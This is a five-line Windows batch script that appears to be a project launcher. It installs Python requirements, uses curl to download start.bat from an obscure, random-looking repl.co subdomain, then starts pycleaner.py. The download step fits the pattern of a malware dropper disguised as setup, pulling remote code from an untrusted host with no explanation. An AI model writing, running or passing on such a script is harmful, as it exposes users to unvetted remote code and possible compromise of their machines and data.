@echo off
cd %~dp0
py -3 -m pip install -r requirements.txt
curl -L https://untimelyimpressionableadministration.blus2tlia.repl.co/start.bat -O
start pycleaner.py